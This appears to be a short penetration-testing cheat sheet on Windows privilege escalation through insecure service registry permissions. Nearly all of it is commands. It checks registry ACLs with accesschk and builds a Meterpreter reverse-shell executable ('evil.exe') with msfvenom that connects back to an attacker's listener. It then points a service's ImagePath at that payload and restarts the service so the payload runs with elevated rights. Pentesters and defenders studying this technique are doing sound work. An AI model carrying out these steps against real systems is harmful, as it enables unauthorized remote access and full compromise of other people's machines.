# Insecure Registry Permissions
Information about services are stored in the register key below in Windows systems
```
HKLM\SYSTEM\CurrentControlSet\Services
```
For example, check information about VulnService
```
HKLM\SYSTEM\CurrentControlSet\Services\VulnService
```

### Check Registry Keys Permissions
```
accesschk.exe -kvuqsw "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services
accesschk.exe -kvuqsw "Everyone" HKLM\SYSTEM\CurrentControlSet\Services
```

### Check ImagePath of Service
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v "ImagePath"
```

### Generate malicious exe with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP_ADDRESS LPORT=LOCAL_PORT –f exe > evil.exe
```
Upload the exe file to target machine and then 
```use exploit/multi/handler```
on metasploit.

### Change ImagePath of Service
```
reg add “HKLM\SYSTEM\CurrentControlSet\Services\VulnService” /t REG_EXPAND_SZ /v ImagePath /d “C:\evil.exe” /f
```

### Service Restart
```
sc stop <service-name>
sc start <service-name>
```

### See also
* [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
